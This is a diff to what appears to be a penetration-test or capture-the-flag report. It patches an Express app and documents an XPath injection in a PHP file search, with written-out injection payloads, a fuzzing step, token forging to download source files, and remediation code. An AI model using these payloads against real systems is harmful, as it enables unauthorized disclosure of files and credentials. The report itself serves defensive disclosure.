+         await db.saveSettings({ name, email, frequency, timezone, greeting, feedback, heatmaps });
+         return res.send(response("Settings saved successfully!"));
+       } catch (e) {
+         console.error(e);
+         return res.status(400).send(response(e.message || "Invalid settings!"));
+       }
+     });
+
+     router.get("/logout", (req, res) => {
+       res.clearCookie("session");
+       return res.redirect("/");
+     });
+
+     router.post("/api/subscribe", async (req, res) => {
+       const { email } = req.body;
+       if (!email || typeof email !== "string") {
+         return res.status(400).send(response("All fields required!"));
+       }
+       await db.addSubscriber(email);
+       return res.send(response("Subscribed successfully!"));
+     });
+
+     router.post("/api/unsubscribe", async (req, res) => {
+       const { email } = req.body;
+       if (!email || typeof email !== "string") {
+         return res.status(400).send(response("All fields required!"));
+       }
+       await db.removeSubscriber(email);
+       return res.send(response("Unsubscribed successfully!"));
+     });
+
+     router.post("/api/login", async (req, res) => {
+       const { username, password } = req.body;
+       if (!username || !password) {
+         return res.status(500).send(response("Missing parameters!"));
+       }
+
+       const user = await db.login(username, password);
+       if (!user) {
+         return res.status(403).send(response("Invalid username or password!"));
+       }
+
+       const { signToken } = require("./auth.js");
+       const token = signToken({ username: user.username });
+       res.cookie("session", token, {
+         maxAge: 3600000,
+         secure: process.env.NODE_ENV === "production",
+         httpOnly: true,
+         sameSite: "strict",
+       });
+       return res.send(response("User authenticated successfully!"));
+     });
+
+     module.exports = (database) => {
+       db = database;
+       return router;
+     };
+   ```
+
+   3. src/index.js
+
+   Add security headers and a simple CSRF middleware.
+
+   ```js
+     const express = require("express");
+     const app = express();
+     const path = require("path");
+     const bodyParser = require("body-parser");
+     const nunjucks = require("nunjucks");
+     const cookieParser = require("cookie-parser");
+     const routes = require("./routes/index.js");
+     const Database = require("./database");
+
+     process.on("uncaughtException", function (err) {
+       console.error(err);
+       console.error(err.stack);
+     });
+
+     const db = new Database("newsletter.db");
+
+     app.use(bodyParser.json());
+     app.use(bodyParser.urlencoded({ extended: true }));
+     app.use(cookieParser());
+
+     app.disable("etag");
+
+     // Security headers
+     app.use((req, res, next) => {
+       res.setHeader("X-Content-Type-Options", "nosniff");
+       res.setHeader("X-Frame-Options", "DENY");
+       res.setHeader("Content-Security-Policy", "default-src 'self'");
+       next();
+     });
+
+     nunjucks.configure("views", {
+       autoescape: true,
+       express: app,
+     });
+
+     app.set("views", "./views");
+     app.use("/static", express.static(path.resolve("static")));
+
+     // Simple double-submit CSRF token middleware
+     app.use((req, res, next) => {
+       const crypto = require("crypto");
+       if (!req.cookies.csrfToken) {
+         const token = crypto.randomBytes(32).toString("hex");
+         res.cookie("csrfToken", token, {
+           httpOnly: true,
+           sameSite: "strict",
+           secure: process.env.NODE_ENV === "production",
+         });
+         req.csrfTokenValue = token;
+       } else {
+         req.csrfTokenValue = req.cookies.csrfToken;
+       }
+
+       req.csrfToken = () => req.csrfTokenValue;
+
+       if (req.method === "GET") return next();
+
+       const headerToken = req.headers["x-csrf-token"];
+       const bodyToken = req.body?._csrf;
+       const cookieToken = req.cookies.csrfToken;
+
+       if (headerToken !== cookieToken && bodyToken !== cookieToken) {
+         return res.status(403).json({ message: "Invalid CSRF token" });
+       }
+
+       next();
+     });
+
+     app.use(routes(db));
+
+     app.all("*", (req, res) => {
+       res.status(404).render("404.html");
+     });
+
+     (async () => {
+       await db.connect();
+       await db.migrate();
+       app.listen(1337, "0.0.0.0", () => console.log("Listening on port 1337"));
+     })();
+   ```
+
+   4. src/routes/auth.js
+
+   Keep random secret generation but ensure token is verified with allowed algorithms only.
+
+   ```js
+     const jwt = require("jsonwebtoken");
+     const crypto = require("crypto");
+
+     const APP_SECRET = process.env.JWT_SECRET || crypto.randomBytes(69).toString("hex");
+
+     module.exports.signToken = function signToken(data) {
+       return jwt.sign({ ...data }, APP_SECRET, { algorithm: "HS256", expiresIn: "1d" });
+     };
+
+     module.exports.AuthMiddleware = async function AuthMiddleware(req, res, next) {
+       try {
+         if (!req.cookies.session) {
+           if (!req.is("application/json")) return res.redirect("/");
+           return res.status(401).json({ status: "unauthorized", message: "Authentication required!" });
+         }
+
+         jwt.verify(req.cookies.session, APP_SECRET, { algorithms: ["HS256"] }, (err, decoded) => {
+           if (err) return res.redirect("/logout");
+           req.data = decoded;
+           next();
+         });
+       } catch (e) {
+         return res.redirect("/logout");
+       }
+     };
+   ```
+
    ─────────────────────
 
 
@@ -4317,420 +4291,422 @@ CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (8.7 - High)
 
 #### Description & Cause
 
-The home.php page accepts a search query via the q GET parameter and passes it directly to query_dev() in xpath.php. That function builds an XPath expression by concatenating the user   
-   input into the query string:                                                                                                                                                              
-                                                                                                                                                                                             
-   ```php                                                                                                                                                                                    
-     $query = "/dataset/file[contains(filename/text(), '{$search_term}')]";                                                                                                                  
-     return $xml->xpath($query);                                                                                                                                                             
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   Because the input is not sanitized, an attacker can inject XPath syntax to alter the query logic and dump the entire XML document. For example, a payload such as:                        
-                                                                                                                                                                                             
-   ```text                                                                                                                                                                                   
-    lasdasdsa')+or+contains(.,'home.php                                                                                                                                                           
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
+The home.php page accepts a search query via the q GET parameter and passes it directly to query_dev() in xpath.php. That function builds an XPath expression by concatenating the user
+   input into the query string:
+
+   ```php
+     $query = "/dataset/file[contains(filename/text(), '{$search_term}')]";
+     return $xml->xpath($query);
+   ```
+
+   Because the input is not sanitized, an attacker can inject XPath syntax to alter the query logic and dump the entire XML document. For example, a payload such as:
+
+   ```text
+    lasdasdsa')+or+contains(.,'home.php
+   ```
+
    closes the existing contains() predicate and unions it with a selector that returns every node. The result is returned in the search-results table on home.php, exposing all file metadata
-   regardless of the user’s role or authentication status.                                                                                                                                   
-                                                                                                                                                                                             
-   The vulnerability is worsened by the fact that home.php performs the search before validating the session cookie, so the injection can be exploited by an unauthenticated attacker.       
-                                                                                                                                                                                             
-   Cause                                                                                                                                                                                     
-                                                                                                                                                                                             
-   1. Unsanitized user input in XPath expression (xpath.php:18)                                                                                                                              
-      The $search_term variable is interpolated directly into the XPath string. There is no escaping, allow-list, or parameterized query.                                                    
-                                                                                                                                                                                             
-   2. Missing authentication before query execution (home.php:6-7)                                                                                                                           
-      The call to query_dev($query) happens before the session validation at lines 29-32, making the endpoint reachable without a valid session.                                             
-                                                                                                                                                                                             
-   3. No input validation                                                                                                                                                                    
-      The application never validates that q contains only expected search characters before using it in the XPath query.                                                                    
-                                                                                                                                                                                             
-   4. Dynamic XPath construction                                                                                                                                                             
-      The developer built the XPath expression with string concatenation instead of using a safe query API or pre-compiled expression with bound parameters.  
+   regardless of the user’s role or authentication status.
+
+   The vulnerability is worsened by the fact that home.php performs the search before validating the session cookie, so the injection can be exploited by an unauthenticated attacker.
+
+   Cause
+
+   1. Unsanitized user input in XPath expression (xpath.php:18)
+      The $search_term variable is interpolated directly into the XPath string. There is no escaping, allow-list, or parameterized query.
+
+   2. Missing authentication before query execution (home.php:6-7)
+      The call to query_dev($query) happens before the session validation at lines 29-32, making the endpoint reachable without a valid session.
+
+   3. No input validation
+      The application never validates that q contains only expected search characters before using it in the XPath query.
+
+   4. Dynamic XPath construction
+      The developer built the XPath expression with string concatenation instead of using a safe query API or pre-compiled expression with bound parameters.
 
 #### Security Impact
 
-Successful exploitation allows an attacker to read the entire contents of /var/www/data.xml, bypassing any access-control logic that relies on the access field. This exposes:            
-                                                                                                                                                                                             
-   • All stored filenames and their full filesystem paths.                                                                                                                                   
-   • Access classifications (public / private) for every file.                                                                                                                               
-   • File types and creation timestamps.                                                                                                                                                     
-                                                                                                                                                                                             
-   With this information, an attacker can:                                                                                                                                                   
-                                                                                                                                                                                             
-   • Discover sensitive files that are intended to remain private.                                                                                                                           
-   • Combine the leaked filenames and paths with the unauthenticated file-download bug in home.php to retrieve protected files using a valid HMAC download token.                            
-   • Map the backend filesystem and identify further attack targets.  
+Successful exploitation allows an attacker to read the entire contents of /var/www/data.xml, bypassing any access-control logic that relies on the access field. This exposes:
+
+   • All stored filenames and their full filesystem paths.
+   • Access classifications (public / private) for every file.
+   • File types and creation timestamps.
+
+   With this information, an attacker can:
+
+   • Discover sensitive files that are intended to remain private.
+   • Combine the leaked filenames and paths with the unauthenticated file-download bug in home.php to retrieve protected files using a valid HMAC download token.
+   • Map the backend filesystem and identify further attack targets.
 
 #### Detailed Walkthrough
 
-1. Identify the vulnerable search endpoint                                                                                                                                                
-      The application exposes a file search feature at http://securedata.htb/query.php (backed by home.php and xpath.php). The q parameter is passed directly into a dynamic XPath query.    
-                                                                                                                                                                                             
-   2. Initial probing                                                                                                                                                                        
-      The pentester submits a benign search term and observes that only public files are normally returned. To test for XPath injection, they submit a payload that breaks out of the        
-      existing contains() predicate and broadens the query:                                                                                                                                  
-                                                                                                                                                                                             
-      ```text                                                                                                                                                                                
-        asd')+or+//text()+or+('1'='1                                                                                                                                                         
-      ```                                                                                                                                                                                    
-                                                                                                                                                                                             
-      The resulting XPath expression becomes:                                                                                                                                                
-                                                                                                                                                                                             
-      ```xpath                                                                                                                                                                               
-        /dataset/file[contains(filename/text(), 'asd') or //text() or ('1'='1')]                                                                                                             
-      ```                                                                                                                                                                                    
-                                                                                                                                                                                             
+1. Identify the vulnerable search endpoint
+      The application exposes a file search feature at http://securedata.htb/query.php (backed by home.php and xpath.php). The q parameter is passed directly into a dynamic XPath query.
+
+   2. Initial probing
+      The tester submits a benign search term and observes that only public files are normally returned. To test for XPath injection, they submit a payload that breaks out of the
+      existing contains() predicate and broadens the query:
+
+      ```text
+        asd')+or+//text()+or+('1'='1
+      ```
+
+      The resulting XPath expression becomes:
+
+      ```xpath
+        /dataset/file[contains(filename/text(), 'asd') or //text() or ('1'='1')]
+      ```
+
       The or //text() and '1'='1' conditions always evaluate to true, causing the query to return every <file> node in data.xml, including files marked as restricted.
 
-                  ![](assets/edited-n4YbSsow.png){width="auto"}
-                                                                                                                                                                                             
-   3. Confirm unrestricted data access                                                                                                                                                       
-      The response now lists files that were previously hidden, confirming the injection works and that the access-control check in the XPath query has been bypassed.                       
-                                                                                                                                                                                             
-   4. Target a specific file                                                                                                                                                                 
-      To prove targeted extraction, the pentester searches for a known filename using contains(.,'home.php'):                                                                                
-                                                                                                                                                                                             
-      ```text                                                                                                                                                                                
-        lasdasdsa')+or+contains(.,'home.php                                                                                                                                                  
-      ```                                                                                                                                                                                    
-                                                                                                                                                                                             
-      The XPath expression becomes:                                                                                                                                                          
-                                                                                                                                                                                             
-      ```xpath                                                                                                                                                                               
-        /dataset/file[contains(filename/text(), 'lasdasdsa') or contains(.,'home.php')]                                                                                                      
-      ```                                                                                                                                                                                    
-                                                                                                                                                                                             
+                  
+
+![n4YbSsow](assets/edited-n4YbSsow.png)
+
+   3. Confirm unrestricted data access
+      The response now lists files that were previously hidden, confirming the injection works and that the access-control check in the XPath query has been bypassed.
+
+   4. Target a specific file
+      To prove targeted extraction, the tester searches for a known filename using contains(.,'home.php'):
+
+      ```text
+        lasdasdsa')+or+contains(.,'home.php
+      ```
+
+      The XPath expression becomes:
+
+      ```xpath
+        /dataset/file[contains(filename/text(), 'lasdasdsa') or contains(.,'home.php')]
+      ```
+
       Only the entry containing home.php is returned, proving the attacker can selectively query the XML document.
 
-![](assets/edited-YKmDKo34.png){width="auto"}
-                                                                                                                                                                                             
-   5. Fuzz for all PHP source files                                                                                                                                                          
-      The pentester replaces the filename string with a fuzz placeholder and sends the request to an intruder tool:                                                                          
-                                                                                                                                                                                             
-      ```text                                                                                                                                                                                
-        lasdasdsa')+or+contains(.,'FUZZ.php                                                                                                                                                  
-      ```                                                                                                                                                                                    
-                                                                                                                                                                                             
-      By fuzzing the FUZZ position with a wordlist of PHP filenames (index, login, config, db, session, admin_panel, etc.), each successful match returns the corresponding <file> node from 
-      data.xml. The leaked metadata includes the full filesystem path for each file.                                                                                                         
-                                                                                                                                                                                             
-   6. Download the source code                                                                                                                                                               
-      With the filename and filepath known from the XML dump, the pentester generates a valid HMAC download token using the hard-coded key from config.php and requests each file via:       
-                                                                                                                                                                                             
-      ```text                                                                                                                                                                                
-        /query.php?file=<filename>&token=<hmac>                                                                                                                                              
-      ```                                                                                                                                                                                    
-                                                                                                                                                                                             
-      The application serves the file contents because home.php processes the download before validating the session. This allows the pentester to download the entire PHP source tree,      
-      including config.php, db.php, session.php, and admin_panel.php.                                                                                                                        
-                                                                                                                                                                                             
-   Result: The XPath injection in the q parameter bypasses access controls and exposes the complete file inventory. Combined with the unauthenticated download path, this leads to full      
-   source-code disclosure, revealing database credentials, session-management logic, and the admin-panel flag location.                                                                      
- 
+![YKmDKo34](assets/edited-YKmDKo34.png)
+
+   5. Fuzz for all PHP source files
+      The tester replaces the filename string with a fuzz placeholder and sends the request to an intruder tool:
+
+      ```text
+        lasdasdsa')+or+contains(.,'FUZZ.php
+      ```
+
+      By fuzzing the FUZZ position with a wordlist of PHP filenames (index, login, config, db, session, admin_panel, etc.), each successful match returns the corresponding <file> node from
+      data.xml. The leaked metadata includes the full filesystem path for each file.
+
+   6. Download the source code
+      With the filename and filepath known from the XML dump, the tester generates a valid HMAC download token using the hard-coded key from config.php and requests each file via:
+
+      ```text
+        /query.php?file=<filename>&token=<hmac>
+      ```
+
+      The application serves the file contents because home.php processes the download before validating the session. This allows the tester to download the entire PHP source tree,
+      including config.php, db.php, session.php, and admin_panel.php.
+
+   Result: The XPath injection in the q parameter bypasses access controls and exposes the complete file inventory. Combined with the unauthenticated download path, this leads to full
+   source-code disclosure, revealing database credentials, session-management logic, and the admin-panel flag location.
+
 
 
 #### Patching and Remediation
 
- 1. Never concatenate user input into XPath expressions. Use strict input validation (allow-list) or escape special XPath characters before interpolation.                                 
-   2. Enforce authentication before executing search queries. Move the session check to the top of home.php so unauthenticated users cannot trigger the XPath query or download files.       
-   3. Store secrets outside source code. Rotate the hard-coded HMAC key and database password and load them from environment variables or a secrets manager.                                 
-   4. Use prepared/parameterized queries where possible. PHP’s SimpleXMLElement::xpath() does not support bound parameters, so input must be validated or escaped before interpolation.      
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   Fixed code                                                                                                                                                                                
-                                                                                                                                                                                             
-   1. xpath.php                                                                                                                                                                              
-                                                                                                                                                                                             
-   Add a sanitization helper that strips or escapes XPath metacharacters, and use it in every function that builds a dynamic XPath query.                                                    
-                                                                                                                                                                                             
-   ```php                                                                                                                                                                                    
-     <?php                                                                                                                                                                                   
-                                                                                                                                                                                             
-     require_once dirname(__FILE__) . '/config.php';                                                                                                                                         
-                                                                                                                                                                                             
-     $xml = simplexml_load_file($xmlfile);                                                                                                                                                   
-                                                                                                                                                                                             
-     /**                                                                                                                                                                                     
-      * Allow only safe characters in a search term.                                                                                                                                         
-      * Permits: letters, digits, spaces, underscores, hyphens, dots, and slashes.                                                                                                           
-      */                                                                                                                                                                                     
-     function sanitize_xpath_term($term)                                                                                                                                                     
-     {                                                                                                                                                                                       
-         if (!is_string($term)) {                                                                                                                                                            
-             return '';                                                                                                                                                                      
-         }                                                                                                                                                                                   
-         // Strip any character that is not safe in an XPath literal context.                                                                                                                
-         return preg_replace('/[^a-zA-Z0-9 _\.\-\/]/', '', $term);                                                                                                                           
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     function query_public($search_term)                                                                                                                                                     
-     {                                                                                                                                                                                       
-         global $xml;                                                                                                                                                                        
-         $search_term = sanitize_xpath_term($search_term);                                                                                                                                   
-         if ($search_term === '') {                                                                                                                                                          
-             return [];                                                                                                                                                                      
-         }                                                                                                                                                                                   
-         $query = "/dataset/file[access/text()='public' and contains(filename/text(), '{$search_term}')]";                                                                                   
-         return $xml->xpath($query);                                                                                                                                                         
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     function query_dev($search_term)                                                                                                                                                        
-     {                                                                                                                                                                                       
-         global $xml;                                                                                                                                                                        
-         $search_term = sanitize_xpath_term($search_term);                                                                                                                                   
-         if ($search_term === '') {                                                                                                                                                          
-             return [];                                                                                                                                                                      
-         }                                                                                                                                                                                   
-         $query = "/dataset/file[contains(filename/text(), '{$search_term}')]";                                                                                                              
-         return $xml->xpath($query);                                                                                                                                                         
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     function get_filepath($filename)                                                                                                                                                        
-     {                                                                                                                                                                                       
-         global $xml;                                                                                                                                                                        
-         $filename = sanitize_xpath_term($filename);                                                                                                                                         
-         if ($filename === '') {                                                                                                                                                             
-             return null;                                                                                                                                                                    
-         }                                                                                                                                                                                   
-         $query = "/dataset/file[filename/text()='{$filename}']/filepath";                                                                                                                   
-         $result = $xml->xpath($query);                                                                                                                                                      
-         return isset($result[0]) ? (string)$result[0] : null;                                                                                                                               
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     function get_filetype_count($type)                                                                                                                                                      
-     {                                                                                                                                                                                       
-         global $xml;                                                                                                                                                                        
-         $type = sanitize_xpath_term($type);                                                                                                                                                 
-         if ($type === '') {                                                                                                                                                                 
-             return 0;                                                                                                                                                                       
-         }                                                                                                                                                                                   
-         $query = "/dataset/file[contains(type/text(), '{$type}')]/filename";                                                                                                                
-         return count($xml->xpath($query));                                                                                                                                                  
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     function get_file_count()                                                                                                                                                               
-     {                                                                                                                                                                                       
-         global $xml;                                                                                                                                                                        
-         $query = "/dataset/file/filename";                                                                                                                                                  
-         return count($xml->xpath($query));                                                                                                                                                  
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     function create_download_token($filename)                                                                                                                                               
-     {                                                                                                                                                                                       
-         global $file_hmac_key;                                                                                                                                                              
-         return hash_hmac('sha256', $filename, $file_hmac_key);                                                                                                                              
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     function is_download_token_valid($filename, $token)                                                                                                                                     
-     {                                                                                                                                                                                       
-         return hash_equals(create_download_token($filename), $token);                                                                                                                       
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     function get_download_link($filename)                                                                                                                                                   
-     {                                                                                                                                                                                       
-         $token = create_download_token($filename);                                                                                                                                          
-         $link = "/query.php?file=" . urlencode($filename) . "&token=" . urlencode($token);                                                                                                  
-         return "<a href=\"{$link}\" target=\"_blank\">Download</a>";                                                                                                                        
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     function customErrorHandler($errno, $errstr, $errfile, $errline)                                                                                                                        
-     {                                                                                                                                                                                       
-         header("HTTP/1.1 500 Internal Server Error");                                                                                                                                       
-         include(dirname(__FILE__) . "/../error.php");                                                                                                                                       
-         exit();                                                                                                                                                                             
-     }                                                                                                                                                                                       
-     set_error_handler("customErrorHandler");                                                                                                                                                
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   2. home.php                                                                                                                                                                               
-                                                                                                                                                                                             
-   Move the session check and role check to the top, before any query or file-download logic. Route public and developer queries through the appropriate function.                           
-                                                                                                                                                                                             
-   ```php                                                                                                                                                                                    
-     <?php                                                                                                                                                                                   
-     require_once('common/session.php');                                                                                                                                                     
-     require_once('common/xpath.php');                                                                                                                                                       
-                                                                                                                                                                                             
-     // Authenticate first                                                                                                                                                                   
-     if (!isset($_COOKIE["session"]) || !get_session_user($_COOKIE["session"])) {                                                                                                            
-         header("Location: /index.php");                                                                                                                                                     
-         exit();                                                                                                                                                                             
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     $user = get_session_properties($_COOKIE["session"]);                                                                                                                                    
-     $role = isset($user["role"]) ? (int)$user["role"] : null;                                                                                                                               
-                                                                                                                                                                                             
-     // File download handling (after authentication)                                                                                                                                        
-     if (isset($_GET['file'])) {                                                                                                                                                             
-         $token = isset($_GET['token']) ? $_GET['token'] : '';                                                                                                                               
-         if (!is_download_token_valid($_GET['file'], $token)) {                                                                                                                              
-             header('HTTP/1.1 401 Unauthorized');                                                                                                                                            
-             echo 'Invalid Download Token!';                                                                                                                                                 
-             exit();                                                                                                                                                                         
-         }                                                                                                                                                                                   
-                                                                                                                                                                                             
-         $filepath = get_filepath($_GET['file']);                                                                                                                                            
-         if (!$filepath || !file_exists($filepath) || !is_file($filepath)) {                                                                                                                 
-             header('HTTP/1.1 404 Not Found');                                                                                                                                               
-             echo 'File not found!';                                                                                                                                                         
-             exit();                                                                                                                                                                         
-         }                                                                                                                                                                                   
-                                                                                                                                                                                             
-         header('Content-Type: application/octet-stream');                                                                                                                                   
-         header('Content-Disposition: attachment; filename="' . basename($filepath) . '"');                                                                                                  
-         header('Content-Length: ' . filesize($filepath));                                                                                                                                   
-                                                                                                                                                                                             
-         readfile($filepath);                                                                                                                                                                
-         exit();                                                                                                                                                                             
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     // Search query handling (after authentication)                                                                                                                                         
-     $query = isset($_GET['q']) ? $_GET['q'] : '';                                                                                                                                           
-     if ($role === 0) {                                                                                                                                                                      
-         $results = query_dev($query);   // admin/developer: query all files                                                                                                                 
-     } else {                                                                                                                                                                                
-         $results = query_public($query); // everyone else: public files only                                                                                                                
-     }                                                                                                                                                                                       
-     ?>                                                                                                                                                                                      
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   3. config.php                                                                                                                                                                             
-                                                                                                                                                                                             
-   Move secrets to environment variables and rotate the HMAC key.                                                                                                                            
-                                                                                                                                                                                             
-   ```php                                                                                                                                                                                    
-     <?php                                                                                                                                                                                   
-                                                                                                                                                                                             
-     $servername = getenv('DB_HOST') ?: '127.0.0.1';                                                                                                                                         
-     $dbusername = getenv('DB_USER') ?: 'db';                                                                                                                                                
-     $password   = getenv('DB_PASSWORD') ?: '';                                                                                                                                              
-     $dBName     = getenv('DB_NAME') ?: 'db';                                                                                                                                                
-                                                                                                                                                                                             
-     $conn = mysqli_connect($servername, $dbusername, $password, $dBName);                                                                                                                   
-                                                                                                                                                                                             
-     if (!$conn) {                                                                                                                                                                           
-         exit("Connection failed: " . mysqli_connect_error());                                                                                                                               
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     $logfile = getenv('LOG_FILE') ?: "/var/www/query_log.txt";                                                                                                                              
-     $log_url = getenv('LOG_API_URL') ?: "http://api.securedata.htb/log";                                                                                                                    
-                                                                                                                                                                                             
-     $xmlfile = "/var/www/data.xml";                                                                                                                                                         
-     $file_hmac_key = getenv('DOWNLOAD_HMAC_KEY') ?: '';                                                                                                                                     
-     if (empty($file_hmac_key)) {                                                                                                                                                            
-         throw new Exception('DOWNLOAD_HMAC_KEY is not configured');                                                                                                                         
-     }                                                                                                                                                                                       
-   ```                                                                                                                                                                                       
+ 1. Never concatenate user input into XPath expressions. Use strict input validation (allow-list) or escape special XPath characters before interpolation.
+   2. Enforce authentication before executing search queries. Move the session check to the top of home.php so unauthenticated users cannot trigger the XPath query or download files.
+   3. Store secrets outside source code. Rotate the hard-coded HMAC key and database password and load them from environment variables or a secrets manager.
+   4. Use prepared/parameterized queries where possible. PHP’s SimpleXMLElement::xpath() does not support bound parameters, so input must be validated or escaped before interpolation.
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   Fixed code
+
+   1. xpath.php
+
+   Add a sanitization helper that strips or escapes XPath metacharacters, and use it in every function that builds a dynamic XPath query.
+
+```php
+     <?php
+
+     require_once dirname(__FILE__) . '/config.php';
+
+     $xml = simplexml_load_file($xmlfile);
+
+     /**
+      * Allow only safe characters in a search term.
+      * Permits: letters, digits, spaces, underscores, hyphens, dots, and slashes.
+      */
+     function sanitize_xpath_term($term)
+     {
+         if (!is_string($term)) {
+             return '';
+         }
+         // Strip any character that is not safe in an XPath literal context.
+         return preg_replace('/[^a-zA-Z0-9 _\.\-\/]/', '', $term);
+     }
+
+     function query_public($search_term)
+     {
+         global $xml;
+         $search_term = sanitize_xpath_term($search_term);
+         if ($search_term === '') {
+             return [];
+         }
+         $query = "/dataset/file[access/text()='public' and contains(filename/text(), '{$search_term}')]";
+         return $xml->xpath($query);
+     }
+
+     function query_dev($search_term)
+     {
+         global $xml;
+         $search_term = sanitize_xpath_term($search_term);
+         if ($search_term === '') {
+             return [];
+         }
+         $query = "/dataset/file[contains(filename/text(), '{$search_term}')]";
+         return $xml->xpath($query);
+     }
+
+     function get_filepath($filename)
+     {
+         global $xml;
+         $filename = sanitize_xpath_term($filename);
+         if ($filename === '') {
+             return null;
+         }
+         $query = "/dataset/file[filename/text()='{$filename}']/filepath";
+         $result = $xml->xpath($query);
+         return isset($result[0]) ? (string)$result[0] : null;
+     }
+
+     function get_filetype_count($type)
+     {
+         global $xml;
+         $type = sanitize_xpath_term($type);
+         if ($type === '') {
+             return 0;
+         }
+         $query = "/dataset/file[contains(type/text(), '{$type}')]/filename";
+         return count($xml->xpath($query));
+     }
+
+     function get_file_count()
+     {
+         global $xml;
+         $query = "/dataset/file/filename";
+         return count($xml->xpath($query));
+     }
+
+     function create_download_token($filename)
+     {
+         global $file_hmac_key;
+         return hash_hmac('sha256', $filename, $file_hmac_key);
+     }
+
+     function is_download_token_valid($filename, $token)
+     {
+         return hash_equals(create_download_token($filename), $token);
+     }
+
+     function get_download_link($filename)
+     {
+         $token = create_download_token($filename);
+         $link = "/query.php?file=" . urlencode($filename) . "&token=" . urlencode($token);
+         return "<a href=\"{$link}\" target=\"_blank\">Download</a>";
+     }
+
+     function customErrorHandler($errno, $errstr, $errfile, $errline)
+     {
+         header("HTTP/1.1 500 Internal Server Error");
+         include(dirname(__FILE__) . "/../error.php");
+         exit();
+     }
+     set_error_handler("customErrorHandler");
+   ```
+
+   2. home.php
+
+   Move the session check and role check to the top, before any query or file-download logic. Route public and developer queries through the appropriate function.
+
+   ```php
+     <?php
+     require_once('common/session.php');
+     require_once('common/xpath.php');
+
+     // Authenticate first
+     if (!isset($_COOKIE["session"]) || !get_session_user($_COOKIE["session"])) {
+         header("Location: /index.php");
+         exit();
+     }
+
+     $user = get_session_properties($_COOKIE["session"]);
+     $role = isset($user["role"]) ? (int)$user["role"] : null;
+
+     // File download handling (after authentication)
+     if (isset($_GET['file'])) {
+         $token = isset($_GET['token']) ? $_GET['token'] : '';
+         if (!is_download_token_valid($_GET['file'], $token)) {
+             header('HTTP/1.1 401 Unauthorized');
+             echo 'Invalid Download Token!';
+             exit();
+         }
+
+         $filepath = get_filepath($_GET['file']);
+         if (!$filepath || !file_exists($filepath) || !is_file($filepath)) {
+             header('HTTP/1.1 404 Not Found');
+             echo 'File not found!';
+             exit();
+         }
+
+         header('Content-Type: application/octet-stream');
+         header('Content-Disposition: attachment; filename="' . basename($filepath) . '"');
+         header('Content-Length: ' . filesize($filepath));
+
+         readfile($filepath);
+         exit();
+     }
+
+     // Search query handling (after authentication)
+     $query = isset($_GET['q']) ? $_GET['q'] : '';
+     if ($role === 0) {
+         $results = query_dev($query);   // admin/developer: query all files
+     } else {
+         $results = query_public($query); // everyone else: public files only
+     }
+     ?>
+   ```
+
+   3. config.php
+
+   Move secrets to environment variables and rotate the HMAC key.
+
+   ```php
+     <?php
+
+     $servername = getenv('DB_HOST') ?: '127.0.0.1';
+     $dbusername = getenv('DB_USER') ?: 'db';
+     $password   = getenv('DB_PASSWORD') ?: '';
+     $dBName     = getenv('DB_NAME') ?: 'db';
+
+     $conn = mysqli_connect($servername, $dbusername, $password, $dBName);
+
+     if (!$conn) {
+         exit("Connection failed: " . mysqli_connect_error());
+     }
+
+     $logfile = getenv('LOG_FILE') ?: "/var/www/query_log.txt";
+     $log_url = getenv('LOG_API_URL') ?: "http://api.securedata.htb/log";
+
+     $xmlfile = "/var/www/data.xml";
+     $file_hmac_key = getenv('DOWNLOAD_HMAC_KEY') ?: '';
+     if (empty($file_hmac_key)) {
+         throw new Exception('DOWNLOAD_HMAC_KEY is not configured');
+     }
+   ```
 
 #### query.php
- 
-                                                                                                                                                                                             
-   ```php                                                                                                                                                                                    
-     <?php                                                                                                                                                                                   
-     require_once('common/session.php');                                                                                                                                                     
-     require_once('common/xpath.php');                                                                                                                                                       
-                                                                                                                                                                                             
-     // query.php is public, but we still apply the sanitized XPath functions.                                                                                                               
-     $query = isset($_GET['q']) ? $_GET['q'] : 'doesnotexist';                                                                                                                               
-     $results = query_public($query);                                                                                                                                                        
-                                                                                                                                                                                             
-     // File download handling                                                                                                                                                               
-     if (isset($_GET['file'])) {                                                                                                                                                             
-         $token = isset($_GET['token']) ? $_GET['token'] : '';                                                                                                                               
-         if (!is_download_token_valid($_GET['file'], $token)) {                                                                                                                              
-             header('HTTP/1.1 401 Unauthorized');                                                                                                                                            
-             echo 'Invalid Download Token!';                                                                                                                                                 
-             exit();                                                                                                                                                                         
-         }                                                                                                                                                                                   
-                                                                                                                                                                                             
-         $filepath = get_filepath($_GET['file']);                                                                                                                                            
-         if (!$filepath || !file_exists($filepath) || !is_file($filepath)) {                                                                                                                 
-             header('HTTP/1.1 404 Not Found');                                                                                                                                               
-             echo 'File not found!';                                                                                                                                                         
-             exit();                                                                                                                                                                         
-         }                                                                                                                                                                                   
-                                                                                                                                                                                             
-         header('Content-Type: application/octet-stream');                                                                                                                                   
-         header('Content-Disposition: attachment; filename="' . basename($filepath) . '"');                                                                                                  
-         header('Content-Length: ' . filesize($filepath));                                                                                                                                   
-                                                                                                                                                                                             
-         readfile($filepath);                                                                                                                                                                
-         exit();                                                                                                                                                                             
-     }                                                                                                                                                                                       
-     ?>                                                                                                                                                                                      
-                                                                                                                                                                                             
-     <!DOCTYPE html>                                                                                                                                                                         
-     <html lang="en">                                                                                                                                                                        
-         <head>                                                                                                                                                                              
-             <?php include_once("common/_head.php"); ?>                                                                                                                                      
-         </head>                                                                                                                                                                             
-         <body>                                                                                                                                                                              
